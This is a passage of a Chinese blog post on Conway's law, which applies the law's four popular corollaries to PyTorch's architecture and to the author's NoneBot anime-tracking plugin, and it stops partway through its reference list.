&lt;p&gt;当下在开源软件、微服务架构、分布式团队等现代开发场景中，康威定律更是频频被验证。例如，开源项目中贡献者来自不同组织或地区，其模块边界往往体现为协作者之间的信任、沟通频率和协作模式；而在企业内部，微服务系统常常沿着团队分布进行服务拆分，这种做法本质上也是康威定律的现实体现。&lt;&#x2F;p&gt;
&lt;p&gt;综上，康威定律的本质在于提醒我们：&lt;strong&gt;组织结构是一种不可忽视的架构约束条件&lt;&#x2F;strong&gt;。理解它，有助于我们更清晰地设计系统边界、识别潜在的协作风险、优化组织沟通，并在软件架构和团队管理之间建立更具适配性的协调机制。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;san-zong-ti-jie-xi-si-tiao-kang-wei-ding-lu-de-jie-du-yu-qi-shi&quot;&gt;三、总体解析：四条康威定律的解读与启示&lt;a class=&quot;zola-anchor&quot; href=&quot;#san-zong-ti-jie-xi-si-tiao-kang-wei-ding-lu-de-jie-du-yu-qi-shi&quot; aria-label=&quot;Anchor link for: san-zong-ti-jie-xi-si-tiao-kang-wei-ding-lu-de-jie-du-yu-qi-shi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;随着软件系统的日益复杂，组织结构与技术架构之间的互动关系也愈发重要。Melvin E. Conway 在其1968年的论文中虽只提出了一条核心论断，但后来在工程实践与管理理论的演绎中，被归纳为更具解释力的四条推论。这些推论不仅揭示了技术架构的“组织映射效应”，也为架构优化提供了组织学视角的思考路径。&lt;&#x2F;p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;序号&lt;&#x2F;th&gt;&lt;th&gt;推论内容（英文）&lt;&#x2F;th&gt;&lt;th&gt;中文释义&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
&lt;tr&gt;&lt;td&gt;1&lt;&#x2F;td&gt;&lt;td&gt;Communication dictates design&lt;&#x2F;td&gt;&lt;td&gt;组织沟通方式会通过系统设计表达出来&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;2&lt;&#x2F;td&gt;&lt;td&gt;There is never enough time to do something right, but there is always enough time to do it over&lt;&#x2F;td&gt;&lt;td&gt;时间再多也难以一次性做对，但总有时间重新做一遍&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;3&lt;&#x2F;td&gt;&lt;td&gt;There is a homomorphism from the linear graph of a system to the linear graph of its design organization&lt;&#x2F;td&gt;&lt;td&gt;系统结构图与设计组织结构图之间存在一种异质同态关系&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;4&lt;&#x2F;td&gt;&lt;td&gt;The structures of large systems tend to disintegrate during development, qualitatively more so than with small systems&lt;&#x2F;td&gt;&lt;td&gt;大型系统在开发中更容易失控崩解，且远甚于小系统&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;small-blue-diamond-di-yi-tiao-communication-dictates-design&quot;&gt;🔹 第一条：&lt;strong&gt;Communication dictates design&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#small-blue-diamond-di-yi-tiao-communication-dictates-design&quot; aria-label=&quot;Anchor link for: small-blue-diamond-di-yi-tiao-communication-dictates-design&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;组织沟通方式决定系统设计方式&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;这是康威定律最为核心也最直观的表述。系统的模块划分、调用结构乃至功能布局，往往受制于开发组织内部的沟通模式与协作形式。团队之间的职责边界、会议频率、信息传达路径，都会在无形中塑造最终的架构轮廓。也就是说，&lt;strong&gt;系统不是凭空设计出来的，而是沟通结构在代码中的镜像&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;启示&lt;&#x2F;strong&gt;：高效沟通能催生清晰的模块边界与合理的解耦关系，而沟通受阻则会引入架构割裂、职责交叉等问题。架构师在做模块划分时，不应只考虑“技术合理性”，更应结合实际的团队构成与沟通能力进行组织匹配设计。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;small-blue-diamond-di-er-tiao-there-is-never-enough-time-to-do-something-right-but-there-is-always-enough-time-to-do-it-over&quot;&gt;🔹 第二条：&lt;strong&gt;There is never enough time to do something right, but there is always enough time to do it over&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#small-blue-diamond-di-er-tiao-there-is-never-enough-time-to-do-something-right-but-there-is-always-enough-time-to-do-it-over&quot; aria-label=&quot;Anchor link for: small-blue-diamond-di-er-tiao-there-is-never-enough-time-to-do-something-right-but-there-is-always-enough-time-to-do-it-over&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;永远没有足够的时间一次做对，但总有时间做完一件事&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;这条定律更像是一种“项目管理规律”，道出软件开发中&lt;strong&gt;快速交付 vs 架构质量&lt;&#x2F;strong&gt;之间的矛盾：现实中的开发通常难以一次性做到理想结构，但最终总会“赶出来一个可交付版本”。然而，第一次的妥协往往会留下技术债务，导致后期需要不断“返工修补”。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;启示&lt;&#x2F;strong&gt;：组织应承认架构设计是一个渐进优化过程，在初始设计中预留演进空间，留出技术债还款的机制，防止短期妥协演变为结构失控。&lt;strong&gt;治理“重做”是制度问题，接受“第一次不完美”则是现实智慧&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;small-blue-diamond-di-san-tiao-there-is-a-homomorphism-from-the-linear-graph-of-a-system-to-the-linear-graph-of-its-design-organization&quot;&gt;🔹 第三条：&lt;strong&gt;There is a homomorphism from the linear graph of a system to the linear graph of its design organization&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#small-blue-diamond-di-san-tiao-there-is-a-homomorphism-from-the-linear-graph-of-a-system-to-the-linear-graph-of-its-design-organization&quot; aria-label=&quot;Anchor link for: small-blue-diamond-di-san-tiao-there-is-a-homomorphism-from-the-linear-graph-of-a-system-to-the-linear-graph-of-its-design-organization&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;系统结构图与组织结构图之间存在一种“同态映射”&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;这是一条数学式的推论，强调系统的依赖图与组织的沟通图之间存在映射关系。尽管系统和组织在形式上看似不同，但它们在结构复杂度与耦合方向上存在&lt;strong&gt;形态相似性&lt;&#x2F;strong&gt;。也就是说，&lt;strong&gt;组织中谁与谁对接，系统中模块就可能谁调用谁&lt;&#x2F;strong&gt;，两者不是偶然重合，而是结构上的必然结果。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;启示&lt;&#x2F;strong&gt;：当我们试图重构系统结构、简化依赖图时，往往也需要同步优化组织间的接口职责、流程配合乃至沟通流程。技术重构不能脱离组织现实，否则会被“组织惯性”拉回旧有形态。
&lt;figure&gt;
    &lt;img src=&quot;&amp;#x2F;imgs&amp;#x2F;image-20250415192716718.png&quot;  alt=&quot;alt text&quot;&gt;
    
    &lt;figcaption&gt;DevOps架构&lt;&#x2F;figcaption&gt;
    
&lt;&#x2F;figure&gt;&lt;&#x2F;p&gt;
&lt;p&gt;从 DevOps 的角度来看，组织必须进行优化，才能快速响应客户需求。 拥有、设计和实现其应用程序和系统的团队在具有以下特征的体系结构中找到了最高级别的自主权：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;支持不断变化的进化体系结构&lt;&#x2F;li&gt;
&lt;li&gt;可部署性&lt;&#x2F;li&gt;
&lt;li&gt;Testability&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;small-blue-diamond-di-si-tiao-the-structures-of-large-systems-tend-to-disintegrate-during-development-more-so-than-small-systems&quot;&gt;🔹 第四条：&lt;strong&gt;The structures of large systems tend to disintegrate during development, more so than small systems&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#small-blue-diamond-di-si-tiao-the-structures-of-large-systems-tend-to-disintegrate-during-development-more-so-than-small-systems&quot; aria-label=&quot;Anchor link for: small-blue-diamond-di-si-tiao-the-structures-of-large-systems-tend-to-disintegrate-during-development-more-so-than-small-systems&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;大型系统在开发过程中更易崩解，远甚于小系统&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;这是对软件系统“不可控性”的重要洞察。系统越大，参与者越多，沟通链条越复杂，组织同步成本越高，也就越容易出现结构紊乱、协作失衡、接口失配等问题。更重要的是，大系统中的局部优化容易牺牲整体架构一致性，导致系统最终**“结构解体”**。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;启示&lt;&#x2F;strong&gt;：大系统要保持结构稳定，必须在组织上配备“架构主心骨”，通过架构治理机制、契约管控、平台化抽象等方式，对抗系统在发展过程中的自然“熵增趋势”。简言之：&lt;strong&gt;系统要稳，组织先稳&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;si-shi-li-shuo-ming-yu-fen-xi-pytorch-xiang-mu-zhong-de-kang-wei-ding-lu-ti-xian&quot;&gt;四、实例说明与分析：PyTorch 项目中的康威定律体现&lt;a class=&quot;zola-anchor&quot; href=&quot;#si-shi-li-shuo-ming-yu-fen-xi-pytorch-xiang-mu-zhong-de-kang-wei-ding-lu-ti-xian&quot; aria-label=&quot;Anchor link for: si-shi-li-shuo-ming-yu-fen-xi-pytorch-xiang-mu-zhong-de-kang-wei-ding-lu-ti-xian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;1-mo-kuai-hua-fen-ji-zu-zhi-bian-jie-de-ji-shu-ying-she&quot;&gt;1. &lt;strong&gt;模块划分即组织边界的技术映射&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-mo-kuai-hua-fen-ji-zu-zhi-bian-jie-de-ji-shu-ying-she&quot; aria-label=&quot;Anchor link for: 1-mo-kuai-hua-fen-ji-zu-zhi-bian-jie-de-ji-shu-ying-she&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;📌 对应康威定律第一条：Communication dictates design
组织的沟通方式会通过系统设计表达出来。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;在 PyTorch 中，系统的模块划分高度贴合团队的职责边界。比如：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;torch.nn&lt;&#x2F;code&gt; 由模型表达团队负责，聚焦在构建神经网络结构的通用组件；&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;torch.autograd&lt;&#x2F;code&gt; 专注于自动微分机制，主要由计算图与求导专家团队开发；&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;torch.cuda&lt;&#x2F;code&gt; &#x2F; &lt;code&gt;torch.xpu&lt;&#x2F;code&gt; 等模块则分别由硬件适配团队或厂商合作开发。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;从提交记录和维护责任划分上可以看到，不同团队各自主导的模块形成了天然的架构边界。这正体现出：&lt;strong&gt;组织之间沟通频率高的部分往往构成内部紧耦合模块，而沟通路径稀疏的团队间接口则被自然抽象为系统边界&lt;&#x2F;strong&gt;，从而形成了“架构即组织图”的设计模式。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;2-jia-gou-bian-ge-yuan-yu-zu-zhi-jie-gou-diao-zheng&quot;&gt;2. &lt;strong&gt;架构变革源于组织结构调整&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-jia-gou-bian-ge-yuan-yu-zu-zhi-jie-gou-diao-zheng&quot; aria-label=&quot;Anchor link for: 2-jia-gou-bian-ge-yuan-yu-zu-zhi-jie-gou-diao-zheng&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;📌 对应康威定律第四条：Large system organizations tend to disintegrate
大型系统组织往往更倾向于分解，系统架构会随组织变动而演进。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;PyTorch 在 2.0 版本中推出的 &lt;code&gt;torch.compile&lt;&#x2F;code&gt; 是一个标志性的系统变革，统一了多个编译子系统（如 Dynamo、AOTAutograd、FX 等）为一个高层编译入口。&lt;&#x2F;p&gt;
&lt;p&gt;这背后的推动力量并非纯粹的技术优化，而是 Meta 对编译相关团队的组织重组——将多个松散的研究项目统一并入一个以“加速执行路径”为目标的协作小组。随着团队重组：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;编译工具的架构开始向“前后端解耦+中间表示共享”演进；&lt;&#x2F;li&gt;
&lt;li&gt;编译相关模块的 API 与调试方式逐步标准化。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;可见，&lt;strong&gt;组织边界的重塑直接牵动了系统架构的重新整合过程&lt;&#x2F;strong&gt;，是典型的“组织投影”在技术结构中的表现。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;3-duo-zu-zhi-xie-zuo-cui-sheng-ke-cha-ba-shi-jia-gou&quot;&gt;3. &lt;strong&gt;多组织协作催生可插拔式架构&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#3-duo-zu-zhi-xie-zuo-cui-sheng-ke-cha-ba-shi-jia-gou&quot; aria-label=&quot;Anchor link for: 3-duo-zu-zhi-xie-zuo-cui-sheng-ke-cha-ba-shi-jia-gou&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;📌 对应康威定律第二条：System architecture reflects organizational structure across entities
跨组织开发导致系统架构趋向“组织拼接”。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;PyTorch 的后端适配能力涵盖了多家企业与研究机构的成果，包括：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Apple 提供的 Metal 支持（&lt;code&gt;torch.mps&lt;&#x2F;code&gt;）；&lt;&#x2F;li&gt;
&lt;li&gt;华为对 Ascend 芯片的适配（&lt;code&gt;torch.npu&lt;&#x2F;code&gt;）；&lt;&#x2F;li&gt;
&lt;li&gt;Intel 提供的 GPU 驱动支持（&lt;code&gt;torch.xpu&lt;&#x2F;code&gt;）；&lt;&#x2F;li&gt;
&lt;li&gt;AWS 通过外部插件维护对其推理芯片的集成。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;这些贡献方各自独立开发、发布节奏不同，为了容纳这些多样性，PyTorch 架构不得不设计为&lt;strong&gt;插件化、驱动化、接口契约清晰&lt;&#x2F;strong&gt;的模式，从而在不同组织之间形成较为清晰的协作边界。这并非技术理性下的“最佳架构”，而是现实协作条件下的“最可交付架构”，恰是第二定律所揭示的“拼合效应”。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;4-gou-tong-ping-jing-dai-lai-de-ge-lie-yu-duo-yang-xing-feng-xian&quot;&gt;4. &lt;strong&gt;沟通瓶颈带来的割裂与多样性风险&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-gou-tong-ping-jing-dai-lai-de-ge-lie-yu-duo-yang-xing-feng-xian&quot; aria-label=&quot;Anchor link for: 4-gou-tong-ping-jing-dai-lai-de-ge-lie-yu-duo-yang-xing-feng-xian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;📌 对应康威定律第三条：There is a homomorphism from the system graph to the organization graph
组织图与系统图之间存在某种同态映射，沟通障碍会反映为架构割裂。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;PyTorch 虽有活跃的开源社区，但部分子系统间依然存在协同不足的问题：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;一些非主流设备的支持模块常年文档缺失，兼容性不稳定；&lt;&#x2F;li&gt;
&lt;li&gt;编译工具链中的 FX、TorchScript、Dynamo 等曾长期并行演进，接口风格不一致，导致学习曲线陡峭。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;这些现象源于开发组织之间沟通频率不高、责任边界不清，导致系统内部出现重复建设和集成代价高的“缝合地带”。这正印证了第三定律：&lt;strong&gt;系统结构在面对沟通受限的现实条件时会产生人为扭曲，甚至损害整体一致性&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;wu-ge-ren-shi-jian-yan-shen-kang-wei-ding-lu-zai-wo-de-xiang-mu-zhong-de-ti-xian&quot;&gt;五、个人实践延伸：康威定律在我的项目中的体现&lt;a class=&quot;zola-anchor&quot; href=&quot;#wu-ge-ren-shi-jian-yan-shen-kang-wei-ding-lu-zai-wo-de-xiang-mu-zhong-de-ti-xian&quot; aria-label=&quot;Anchor link for: wu-ge-ren-shi-jian-yan-shen-kang-wei-ding-lu-zai-wo-de-xiang-mu-zhong-de-ti-xian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;lbsucceed&#x2F;nonebot-plugin-track-anime&quot;&gt;&lt;strong&gt;nonebot-plugin-track-anime&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; 是一个基于 Python 异步机器人框架 NoneBot 开发的插件，主要用于服务 QQ 机器人平台，提供 &lt;strong&gt;动漫更新追踪、订阅管理、自动推送提醒&lt;&#x2F;strong&gt; 等功能。项目由个人主导开发，规模不大，但功能上涵盖了数据聚合、异步调度、用户状态管理等典型模块。&lt;&#x2F;p&gt;
&lt;p&gt;尽管项目是个人开发，整个开发过程中，受文档与社区启发，我逐步意识到自己在架构设计上的许多决策，其实与康威定律的原始表述存在天然契合。以下将结合原始四条康威定律，对项目架构的具体体现做出解析。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h4 id=&quot;1-jie-kou-feng-ge-ying-she-yi-gou-zu-zhi-jie-gou&quot;&gt;1. &lt;strong&gt;接口风格映射异构组织结构&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-jie-kou-feng-ge-ying-she-yi-gou-zu-zhi-jie-gou&quot; aria-label=&quot;Anchor link for: 1-jie-kou-feng-ge-ying-she-yi-gou-zu-zhi-jie-gou&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;对应定律：&lt;strong&gt;康威第一定律&lt;&#x2F;strong&gt;（Communication dictates design）
系统的设计会体现出开发者之间的沟通方式。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;尽管项目由我主导，但由于依赖多个外部平台提供的数据源（如 Bangumi、AniList、Mikan），我不得不针对每个上游服务编写适配逻辑。每个服务的 API 设计风格、数据模型、稳定性差异明显，沟通形式也各异——有些开放文档详尽，有些则需反复调试探索。&lt;&#x2F;p&gt;
&lt;p&gt;为了降低对主流程的干扰，我将不同数据源的逻辑封装进统一的抽象层（如 &lt;code&gt;fetcher&lt;&#x2F;code&gt; 模块），每个上游服务成为一个独立的“接入点”，整体架构也随之演化出明显的“多头结构”。&lt;&#x2F;p&gt;
&lt;p&gt;这种设计正体现了“沟通方式决定架构”的康威第一定律：系统最终形成的模块划分，反映的不是理想化的功能切分，而是&lt;strong&gt;我与各服务之间沟通摩擦最小化的结构结果&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h4 id=&quot;2-duo-zu-zhi-jie-ru-dao-zhi-xi-tong-cheng-xian-pin-jie-te-zheng&quot;&gt;2. &lt;strong&gt;多组织接入导致系统呈现拼接特征&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-duo-zu-zhi-jie-ru-dao-zhi-xi-tong-cheng-xian-pin-jie-te-zheng&quot; aria-label=&quot;Anchor link for: 2-duo-zu-zhi-jie-ru-dao-zhi-xi-tong-cheng-xian-pin-jie-te-zheng&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;对应定律：&lt;strong&gt;康威第二定律&lt;&#x2F;strong&gt;（There is never enough time to do something right, but there is always enough time to do it over）
系统由多个组织共同开发时，架构将是这些组织结构的拼接体。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;虽为个人项目，但本插件实质上站在多个上游服务之上开发，可以视为一种“跨组织集成”。各数据源的差异不仅在内容层面，更体现在其演进节奏和接口稳定性上。这迫使系统内部保留了多个“适配逻辑分支”以应对未来可能的接口变动。&lt;&#x2F;p&gt;
&lt;p&gt;例如：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;某些 API 需频繁更新签名机制；&lt;&#x2F;li&gt;
&lt;li&gt;某些源的内容结构不稳定，只能通过缓存与预解析规避异常；&lt;&#x2F;li&gt;
&lt;li&gt;对少量站点甚至需使用 HTML 抓取替代开放接口。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;这些“补丁式设计”并非一开始就规划好，而是在“赶着先用起来”的现实驱动下自然生长而来。它们正是康威第二定律的实践体现：&lt;strong&gt;现实限制迫使系统用“拼接”的方式完成演进&lt;&#x2F;strong&gt;，而后再逐步打磨与抽象。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h4 id=&quot;3-gong-neng-yan-hua-shou-zu-zhi-jiao-se-diao-zheng-qu-dong&quot;&gt;3. &lt;strong&gt;功能演化受组织角色调整驱动&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#3-gong-neng-yan-hua-shou-zu-zhi-jiao-se-diao-zheng-qu-dong&quot; aria-label=&quot;Anchor link for: 3-gong-neng-yan-hua-shou-zu-zhi-jiao-se-diao-zheng-qu-dong&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;对应定律：&lt;strong&gt;康威第四定律&lt;&#x2F;strong&gt;（The structures of large systems tend to disintegrate during development）
大型系统在开发过程中往往趋向解构，而非收敛。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;随着用户提出更多订阅管理、状态追踪等功能需求，我在开发中逐步引入了持久化模块、异步任务调度等架构层改造。在此过程中，也有协作者参与提出设计思路，这使我从“孤立开发者”变为“协同沟通者”，项目沟通结构发生了变化。&lt;&#x2F;p&gt;
&lt;p&gt;于是系统也随之发生了如下演进：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;推送逻辑从即时响应变为定时调度（基于 APScheduler）；&lt;&#x2F;li&gt;
&lt;li&gt;状态管理从内存转为数据库持久化；&lt;&#x2F;li&gt;
&lt;li&gt;模块之间不再直接耦合，通过事件机制协调。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;这些演进并不是因为功能需求本身变复杂，而是&lt;strong&gt;沟通模式发生改变&lt;&#x2F;strong&gt;。正如康威第四定律所揭示的那样：&lt;strong&gt;系统的结构随组织协作结构演化而演化。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h4 id=&quot;4-zi-yuan-you-xian-dao-zhi-jie-gou-ge-lie-yu-tuo-xie&quot;&gt;4. &lt;strong&gt;资源有限导致结构割裂与妥协&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-zi-yuan-you-xian-dao-zhi-jie-gou-ge-lie-yu-tuo-xie&quot; aria-label=&quot;Anchor link for: 4-zi-yuan-you-xian-dao-zhi-jie-gou-ge-lie-yu-tuo-xie&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;对应定律：&lt;strong&gt;康威第三定律&lt;&#x2F;strong&gt;（There is a homomorphism from the linear graph of a system to the linear graph of its design organization）
系统结构与组织架构之间存在潜在映射关系。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;在开发中，受限于时间、人力和注意力成本，我时常只能一次关注一个子模块。这种“串行式”注意力分配，使得系统演进过程中逐渐出现“功能孤岛”：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;某些功能组件耦合较高，不易复用；&lt;&#x2F;li&gt;
&lt;li&gt;文档撰写与测试滞后，用户需阅读源码；&lt;&#x2F;li&gt;
&lt;li&gt;部分临时方案延迟了标准化抽象（例如订阅模型早期设计简单，导致后期状态管理迁移较复杂）。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;这其实是&lt;strong&gt;个人资源限制形成的一种“类组织结构”&lt;&#x2F;strong&gt;，它影响了系统结构的“均衡性”和“内聚性”。康威第三定律指出，组织形式的线性图将在系统中留下映射，这在个人项目中同样成立。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;liu-wei-lai-xue-xi-yu-gong-zuo-de-qi-shi&quot;&gt;六、未来学习与工作的启示&lt;a class=&quot;zola-anchor&quot; href=&quot;#liu-wei-lai-xue-xi-yu-gong-zuo-de-qi-shi&quot; aria-label=&quot;Anchor link for: liu-wei-lai-xue-xi-yu-gong-zuo-de-qi-shi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;康威定律不仅是一个架构原则，更是一种&lt;strong&gt;软技能与技术相结合的工作方法论&lt;&#x2F;strong&gt;。对软件工程师而言，它的启发包括：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;在系统设计早期，就要&lt;strong&gt;考虑组织结构与合作模式&lt;&#x2F;strong&gt;；&lt;&#x2F;li&gt;
&lt;li&gt;架构设计不能脱离沟通实际，模块应围绕团队能力划分；&lt;&#x2F;li&gt;
&lt;li&gt;在多人协作中，应强化接口契约意识，降低“沟通成本”；&lt;&#x2F;li&gt;
&lt;li&gt;架构演进需考虑组织演进的节奏与变化。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;qi-jie-lun&quot;&gt;七、结论&lt;a class=&quot;zola-anchor&quot; href=&quot;#qi-jie-lun&quot; aria-label=&quot;Anchor link for: qi-jie-lun&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;康威定律并非静态定律，而是一种动态反映——它揭示了&lt;strong&gt;人与系统之间的映射关系&lt;&#x2F;strong&gt;。在软件工程实践中，无论是微服务架构、开源协作，还是团队重构，其背后都能看到康威定律的影子。理解这一原理，不仅有助于构建更具可维护性和演进性的系统，也能指导我们进行更合理的团队组织与沟通设计，是每一位软件工程从业者都应掌握的重要理论工具。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;can-kao&quot;&gt;参考&lt;a class=&quot;zola-anchor&quot; href=&quot;#can-kao&quot; aria-label=&quot;Anchor link for: can-kao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;microsoft-365-life-hacks&#x2F;organization&#x2F;what-is-conways-law&quot;&gt;Conway’s Law Examples in the Real World&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.splunk.com&#x2F;en_us&#x2F;blog&#x2F;learn&#x2F;conways-law.html&quot;&gt;Conway’s Law Explained&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
